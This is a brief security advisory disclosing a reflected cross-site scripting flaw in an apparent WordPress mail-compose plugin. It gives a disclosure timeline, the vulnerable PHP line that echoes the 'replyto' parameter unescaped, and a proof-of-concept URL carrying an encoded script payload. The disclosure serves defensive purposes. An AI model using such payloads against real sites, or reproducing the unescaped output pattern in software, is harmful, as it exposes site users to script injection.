*Timeline*

* 2016-07-23: Vendor Notified
* 2016-07-26: Fixed in version 1.2 

*Vulnerability*: The `replyto` parameter when composing a mail allows for a reflected XSS. 

	$replyTo = isset($_GET['replyto']) ? $_GET['replyto'] : '';
	...
	<input type="text" class="form-control" placeholder="Enter receiver's wordpress email" name="reciever_mail" required="required" value="<?php echo !empty($replyTo) ? $replyTo : $to; ?>">
 
*Proof of Concept*: Altering the url would allow for the XSS to be executed

`http://wordpress.site/wp-admin/admin.php?page=wp_mail_compose&replyto=%22%3E%3Cscript+src%3Ddata%3A%26comma%3Balert%281%29%2F%2F`

would execute `alert(1)` but could be used to run something more malicious
